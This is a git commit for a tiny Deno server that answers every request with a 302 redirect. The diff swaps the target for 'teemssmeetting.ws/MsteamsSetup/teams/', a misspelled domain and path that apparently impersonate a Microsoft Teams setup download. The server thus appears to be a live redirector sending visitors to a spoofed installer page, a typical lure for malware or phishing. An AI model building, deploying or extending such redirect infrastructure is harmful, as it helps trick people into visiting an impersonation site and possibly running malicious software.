da80978047f8ad97ddcfde71e382dddc5594ee76
Digital2025001 <bosmichael30@gmail.com>
2026-01-15 07:02:03 -0800

    Update redirect location in main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://poemcellars.com/", // Replace this with your actual link
+      Location: "https://teemssmeetting.ws/MsteamsSetup/teams/", // Replace this with your actual link
     },
   });
 });
